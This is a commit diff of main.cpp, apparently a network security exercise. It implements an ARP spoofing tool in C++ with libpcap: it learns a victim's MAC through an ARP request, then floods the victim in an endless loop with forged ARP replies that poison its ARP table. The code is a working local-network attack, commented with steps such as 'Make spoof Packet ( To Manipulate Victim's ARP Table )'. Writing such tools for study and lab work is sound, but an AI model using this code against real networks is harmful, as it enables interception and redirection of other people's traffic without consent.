2144234c9673f949d3c28239fd73f4f5b6e0f35f
hyeop <gksvnsfl@naver.com>
2019-08-05 23:07:11 +0900

    Modify main.cpp

--- main.cpp
+++ main.cpp
@@ -13,6 +13,7 @@ struct ethernet_header{
     uint8_t src_mac[6];
     uint16_t type;
 };
+
 struct arp_header{
     struct ethernet_header eth;
     uint16_t hd_type;
@@ -32,6 +33,7 @@ void print_usage(){
     printf("!! Sender IP & Target IP & Your IP in same area !!\n");
 }
 
+// To set my Info : ipstr, macstr, netmask
 void my_info_setting(char *dev, uint8_t *ipstr, uint8_t *macstr, uint8_t *netmask){
 
     ifreq ifr;
@@ -48,6 +50,8 @@ void my_info_setting(char *dev, uint8_t *ipstr, uint8_t *macstr, uint8_t *netmas
     memcpy((char *)macstr, ifr.ifr_hwaddr.sa_data, 48);
 }
 
+
+// To check : Two input IP in my Area
 int ip_range_check(uint8_t *myip, uint8_t *senderip, uint8_t *targetip, uint8_t *netmask){
     uint8_t my_area[4];
     uint8_t sender_area[4];
@@ -67,6 +71,7 @@ int ip_range_check(uint8_t *myip, uint8_t *senderip, uint8_t *targetip, uint8_t 
 }
 
 
+// To change Value : IP Type > int, int, int ,int ('.' split)
 void ip_change(char * ip, uint8_t * unchanged_ip){
 
 
@@ -80,14 +85,15 @@ void ip_change(char * ip, uint8_t * unchanged_ip){
     unchanged_ip[3] = (uint8_t)atoi(d);
 }
 
+
 int main(int argc, char * argv[]){
 
     struct arp_header arp;
-    //structure pointer declare
     pcap_pkthdr* header;
     const u_char* packet;
     char* dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
+
     uint8_t myip[4];
     uint8_t mymac[6];
     uint8_t netmask[4];
@@ -95,15 +101,21 @@ int main(int argc, char * argv[]){
     uint8_t targetip[4];
     uint8_t targetmac[6];
 
+
+    // argc check !! 
     if(argc != 4){
         print_usage();
         return -1;
     }
 
+    // get my info
     my_info_setting(dev, myip, mymac, netmask);
+
+    // change argv[]'s format
     ip_change(argv[2], senderip);
     ip_change(argv[3], targetip);
 
+    // check argv[]'s area 
     if(!ip_range_check(myip, senderip, targetip, netmask)){
         print_usage();
         return -1;
@@ -116,6 +128,8 @@ int main(int argc, char * argv[]){
         return -1;
     }
 
+
+    // Make ARP normal Packet ( To find Victim's Mac address )
     memcpy((char*)arp.eth.dest_mac, "\xff\xff\xff\xff\xff\xff", 6);
     for(int i=0; i<6; i++)  arp.eth.src_mac[i] = mymac[i];
     arp.eth.type = (uint16_t)ntohs(0x0806);
@@ -127,24 +141,29 @@ int main(int argc, char * argv[]){
     for(int i=0; i<4; i++)   arp.sender_ip[i] = myip[i];
     for(int i=0; i<6; i++)   arp.sender_mac[i] = mymac[i];
     memcpy((char*)arp.target_mac,"\x00\x00\x00\x00\x00\x00",6);
-    for(int i=0; i<4; i++)   arp.target_ip[i] = targetip[i];
+    for(int i=0; i<4; i++)   arp.target_ip[i] = senderip[i];
     pcap_sendpacket(handle,(u_char*)&arp, sizeof(arp));	
+
 
     while(true){
         int res = pcap_next_ex(handle, &header, &packet);
         if(res == 0) continue;
         if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;
 
+	// change packet's format to ARP packet
         struct arp_header * arp_message = (arp_header *)packet;
-        if(ntohs(arp_message->opcode) == 0x0002){
+
+	// check ARP reply Packet
+        if(arp_message->opcode== ntohs(0x0002)){
             int i;
             for(i=0; i<4 ; i++){
-                if(arp_message->sender_ip[i] != targetip[i])
+                if(arp_message->sender_ip[i] != senderip[i])
                     break;
             }
             if(i==4){
                 for(int i=0; i<6; i++){
                     targetmac[i] = arp_message->sender_mac[i];
+		    printf("%02x ", targetmac[i]);
                 }
                 break;
             }
@@ -153,7 +172,8 @@ int main(int argc, char * argv[]){
         }
     }
 
-    
+
+    // Make spoof Packet ( To Manipulate Victim's ARP Table )
     for(int i=0; i<6; i++)  arp.eth.dest_mac[i] = targetmac[i];
     for(int i=0; i<6; i++)  arp.eth.src_mac[i] = mymac[i];
     arp.eth.type = (uint16_t)ntohs(0x0806);
@@ -162,11 +182,12 @@ int main(int argc, char * argv[]){
     arp.hlen = (uint8_t)0x06;
     arp.plen = (uint8_t)0x04;
     arp.opcode = (uint16_t)ntohs(0x0002);
-    for(int i=0; i<4; i++)   arp.sender_ip[i] = senderip[i];
+    for(int i=0; i<4; i++)   arp.sender_ip[i] = targetip[i];
     for(int i=0; i<6; i++)   arp.sender_mac[i] = mymac[i];
     memcpy((char*)arp.target_mac, targetmac,6);
-    for(int i=0; i<4; i++)   arp.target_ip[i] = targetip[i];
+    for(int i=0; i<4; i++)   arp.target_ip[i] = senderip[i];
     
+    // Send ARP spoof Packet
     while(true){
         pcap_sendpacket(handle,(u_char*)&arp, sizeof(arp));
     }
